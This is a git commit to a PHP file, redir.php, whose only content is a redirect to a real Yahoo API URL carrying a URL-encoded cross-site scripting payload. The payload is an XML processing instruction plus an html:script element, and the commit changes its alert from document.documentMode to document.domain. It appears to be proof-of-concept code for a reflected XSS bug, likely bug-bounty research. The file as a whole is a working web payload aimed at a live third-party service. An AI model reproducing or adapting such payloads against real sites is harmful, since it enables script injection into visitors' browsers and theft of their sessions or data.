a5bf9dfaf3ce277604498d035f798fd6e318e04a
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-22 01:48:23 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,3 @@
 <?php
-header('location: http://api.view.yahoo.com/api/series/xxxxxa%3C%3fPXML%3E%3Chtml:script%3Ealert(document.documentMode)%3C%2fhtml:script%3E');
+header('location: http://api.view.yahoo.com/api/series/xxxxxa%3C%3fPXML%3E%3Chtml:script%3Ealert(document.domain)%3C%2fhtml:script%3E');
 ?>
